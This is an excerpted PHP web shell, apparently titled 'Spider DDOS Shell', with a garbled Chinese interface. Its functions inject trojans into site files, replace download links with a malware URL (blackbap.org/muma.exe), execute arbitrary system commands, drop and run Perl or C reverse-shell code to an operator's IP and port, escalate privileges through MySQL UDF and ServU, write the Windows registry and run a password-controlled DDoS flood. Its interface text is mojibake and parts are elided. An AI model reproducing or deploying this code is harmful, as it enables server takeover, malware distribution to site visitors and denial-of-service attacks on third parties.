...
function File_Act($array,$actall,$inver)
{
	...
	while($i < $count)
	{
		...
		switch($actall)
		{
			...
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '޸ʱΪ'.$inver; break;
		}
		$i++;
	}
	return 'ѡļ'.$msg.'';
		...
		if(count($_FILES['soup']) >= 1)
		{
			...
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					...
					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'ϴɹ' : $soupname.'ϴʧ';
				}
				$i++;
			}
		}
...
function File_a($p)
{
	...
	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? 'ϴļ '.$upfilename.' ɹ' : 'ϴļ '.$upfilename.' ʧ';}
	...
	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'ɾĿ¼ '.$_GET['dd'].' ɹ' : 'ɾĿ¼ '.$_GET['dd'].' ʧ';}
...
<table border="0"><tr><td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>ϼĿ¼</b></a></td>
...
<input type="button" value="" onclick="SubmitUrl('ѡļΪ: ','silic.gz','e');return false;"> 
Ŀ¼({$NUM_D}) / ļ({$NUM_F})</div> 
</form> 
END;
	return true;
...
function Guama_b()
{
	if((!empty($_POST['gp'])) && (!empty($_POST['gt'])) && (!empty($_POST['gc'])))
	{
		...
		if(stristr($_POST['gc'],'[-') && stristr($_POST['gc'],'-]'))
		{
			...
			if(!eregi("^[0-9]{1,2}$",$nc[1][0])){echo '<a href="#" onclick="history.back();">쳣ֹ</a>'; return false;}
			$gm = (int)$nc[1][0];
			$gf = $nc[0][0];
		}
		else
		...
		echo Guama_Auto($_POST['gp'],$_POST['gt'],$_POST['gl'],$_POST['gc'],$gm,$gf,$_POST['gi'],$gk,$gd,$gb) ? '<a href="#" onclick="history.back();"></a>' : '<a href="#" onclick="history.back();">쳣ֹ</a>';
		echo '</div>';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
...
function autorun()
{
	...
	if(document.getElementById('gt').value == ''){alert('ͲΪ');return false;}
...
<input type="radio" name="gi" value="b">ļ<input type="radio" name="gi" value="c"> ļĩβ</div>
...
<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>Ӧڸļ,ļкļ<br><input type="radio" name="gb" value="b">Ӧڸļ</div>
...
function Qingma_c()
{
	if((!empty($_POST['qp'])) && (!empty($_POST['qt'])) && (!empty($_POST['qc'])))
	{
		...
		echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '<a href="#" onclick="history.back();"></a>' : '<a href="#" onclick="history.back();">쳣ֹ</a>';
		echo '</div>';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
...
function autoup(){
	...
	if(document.getElementById('qt').value == ''){alert('ͲΪ');return false;}
...
function Tihuan_d()
{
	if((!empty($_POST['tp'])) && (!empty($_POST['tt'])))
	{
		...
		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href="#" onclick="window.location=\'?s=d\'">滻</a>' : '<a href="#" onclick="window.location=\'?s=d\'">쳣ֹ</a>';
		echo '</div>';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
...
function showth(th){
	...
	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>غ׺ <input type="text" name="tca" id="tca" value=".exe|.7z|.rar|.zip|.gz|.txt" style="width:500px;"><br><br>滻Ϊ <input type="text" name="tcb" id="tcb" value="http://blackbap.org/muma.exe" style="width:500px;">';
	return true;
}
function autoup(){
	if(document.getElementById('tp').value == ''){alert('·Ϊ');return false;}
	if(document.getElementById('tt').value == ''){alert('ͲΪ');return false;}
	if(document.getElementById('tca').value == ''){alert('벻Ϊ');return false;}
...
function Antivirus_e()
{
	...
	$features_php = array('evalһ仰'=>'eval(','read'=>'->read()','readdir3'=>'readdir(','MYSQLԶ庯'=>'returns string soname','1'=>'eval(gzinflate(','2'=>'eval(base64_decode(','3'=>'base64_decode(','evalһ仰2'=>'eval (','php'=>'copy($_FILES','2'=>'copy ($_FILES','ϴ'=>'move_uploaded_file($_FILES','ϴ2'=>'move_uploaded_file ($_FILES','С'=>'str_replace(\'\\\\\',\'/\',');
	$features_asx = array('ű'=>'VBScript.Encode',''=>'#@~^','fso'=>'fso.createtextfile(path,true)','excuteһ仰'=>'execute','evalһ仰'=>'eval','wscript'=>'F935DC22-1CF0-11D0-ADB9-00C04FD58A0B','ݿ'=>'13709620-C279-11CE-A49E-444553540000','wscript'=>'WScript.Shell','fso'=>'0D43FE01-F093-11CF-8940-00A0C9054228','ʮ'=>'','aspx'=>'Process.GetProcesses','aspxһ仰'=>'Request.BinaryRead');
print<<<END
...
<div class="actall" style="height:50px;"><input type="radio" name="sb" value="a" checked>ɨӦڸļ,ļкļ
<br><input type="radio" name="sb" value="b">ɨӦڸļ</div>
...
if(!empty($_POST['sp']))
{
	...
	echo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? 'ɨ' :  '쳣ֹ';
	echo '</div>';
}
return true;
}
...
<div class="actall">ؼִ <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
<input type="radio" name="sff" value="a" checked>ļ 
<input type="radio" name="sff" value="b"></div>
<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>Ӧڸļ,ļкļ
<br><input type="radio" name="sfb" value="b">Ӧڸļ</div>
<div class="actall"><input type="submit" value="ʼɨ" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['sfp'])) && (!empty($_POST['sfc'])))
	{
		...
		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '' : '쳣ֹ';
		echo '</div>';
	}
	return true;
}
...
print<<<END
<div class="actall">ִCMD <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
...
END;
	if(!empty($_POST['run']))
	{
		...
		echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? 'ִгɹ' : 'ִʧ';
		@$shell->Release();
		$shell = NULL;
		echo '</div>';
	}
...
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		...
		if($_POST['use'] == 'perl')
		{
			...
			echo File_Write('/tmp/yoco_bc',base64_decode($back_connect_pl),'wb') ? '/tmp/yoco_bcɹ<br>' : '/tmp/yoco_bcʧ<br>';
			$perlpath = Exec_Run('which perl');
			$perlpath = $perlpath ? chop($perlpath) : 'perl';
			echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'ִʧ';
		}
		if($_POST['use'] == 'c')
		{
			...
			echo File_Write('/tmp/yoco_bc.c',base64_decode($back_connect_c),'wb') ? '/tmp/yoco_bc.cɹ<br>' : '/tmp/yoco_bc.cʧ<br>';
			$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/yoco.c');
			echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'ִʧ';
		}
		echo '<br>ԳӶ˿ (nc -l -n -v -p '.$_POST['yourport'].') </div>';
	}
	return true;
}
...
print<<<END
<div class="actall"><h5>phpftpӲ(δ)</h5></div>
...
$conn = @ftp_connect($ftphost) or die("޷");
    ...
    echo "<pre>";
    echo "ǰļ:<font color='#FF0000'>$ftpfolder</font>:<br>";
...
if ($upaction == 'upfile') {
    ...
    if(@ftp_login($conn,$ftpuser,$ftppass)){
        ...
        if (empty($res_code)){
          echo '<font color="#FF67A0">ϴʧ</font><br>';
        }
        else{
         echo '<font color="#FF67A0">ϴɹ</font><br>';
        } 
    }
}
print<<<END
...
if(!empty($_POST['code']))
{
	...
	if(!$Shell_Code) $Shell_Code = 'Ҳshellcodeurl';
...
<input type="radio" name="xor" value="a"{$checkeda}>XORת <input type="radio" name="xor" value="b"{$checkedb}>XORת</div>
...
print<<<eof
<div class="actall"><h5>php socketִcmdshellӣΪWinϵͳ<br>php_socketsΪopen<br>ͨphpinfo()鿴Ƿ<br>ҪäĿӣɷԴľغ</h5></div>
...
$query = "SELECT udf FROM udf_temp INTO DUMPFILE '".$dir."';" ;
	if(!mysql_query($query, $link))
	{
		die("װʧ:$dirȨ".mysql_error());
	}
	else
	{
		echo '<font style=font:11pt color=ff0000>'.$dir.'װɹ</font><br>';
	}
}
mysql_query('DROP TABLE udf_temp', $link) or die(mysql_error());
...
<select onchange="return oraFull(options[selectedIndex].value)">
	...
	<option value="6">ȡļ</option>
	<option value="7">дļ</option>
</select>
...
echo '<div class="actall"><h5>Windowsעд</h5></div>';
print<<<END
...
print<<<END
<TR><form action="" method="post">   
<div class="actall"><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>λ:<input type="text" name="wpath" value="{$wpath}" size="70"><BR><br> 
:<input type="text" name="wtype" value="{$wtype}" size="20"> ֵ:<input type="text" name="wvalue" value="{$wvalue}" size="30">
<input type="hidden" name="action" value="write"><input class="bt" type="submit" value="д"></form></TD></TR></div>   
END;
...
<TR><form action="" method="post">   
<div class="actall"><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>  
λ:<input type="hidden" name="action" value="del">   
...
{
echo "<center><h1>Spider DDOS Shell</h1></center>";
echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spider DDOS Shell Spiderհ޸,ѯPRٶ¼վȨأ԰վΪ׼Ժ󽫼ALEXAsosoϢһѯ¡<br>";

echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;޸<font color=red>һ仰Evilͨshell</font>ò˵ӡ<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;շ籩DDOS,ùһԼվаȫ⣬ѹԣľ,ȼ⹥һ塣<p>";

echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=red>ͳƴ</font>ԴӸȥţֹϢȡ,ǿҽͳƴ롣<p>";
...
<div class="topbg"> &nbsp; {$Server_IP} - {$Server_OS} - <a href="{$Server_Alexa}" target="_blank">Alexa</a></div>
	<div style="height:546px;">
		...
		<tr><td width="140" align="center" valign="top">
			...
			<li><a href="?s=ee" id="t_19" onclick="switchTab('t_19')" target="main">MYSQLȨ</a></li>
			<li><a href="?s=gg" id="t_22" onclick="switchTab('t_22')" target="main">ݿ</a></li>
			<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main">ɨľ</a></li>
			...
			<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main">ServUȨ</a></li>
			...
			<li><a href="?s=ff" id="t_20" onclick="switchTab('t_20')" target="main">ִphp</a></li>
			<li><a href="?s=s" id="t_16" onclick="switchTab('t_16')" target="main"> -- </a></li>
...
if(!file_exists($key_file)){	//ûзļ
	write_inc($key_file,"<?php\n return \"die\";\n?>",true);
}

$mkey = include $key_file;
if($_GET["act"]=="die"){//ֹͣ
	if(!function_exists("fsockopen")){exit("errorSHELLȱٱҪ֧.");}
	if(!function_exists("set_time_limit") or !function_exists("ignore_user_abort")){exit("errorSHELL޷Զ.");}
	if(@trim($_GET["pass"])<>trim($password)){echo("errorSHELL,޷ֹͣ.");}
...
if($_GET["act"]=="attack"){ //ʼ
		...
		if(@trim($_GET["pass"])<>trim($password)){exit("errorSHELL,޷.");}
		write_inc($key_file,"<?php\n return \"true\";\n?>",true);
		$ip = gethostbyname($_GET["ip"]); //ַ
		$rand = trim($_GET["port"]);   //˿
		$exec_time = trim($_GET["exec_time"]);  //ʱ,λ
		$att_size= trim($_GET["att_size"]);  //С
		$time =  time(); 
...
function write_inc($path,$strings,$type=false) //дļ
{   
...
{
	ob_start();
	$MSG_TOP = 'PHP Spider DDOS Shell 籩ʱ';
...
echo "</br><center><form method='post'><input type='submit' value='    '></center>";
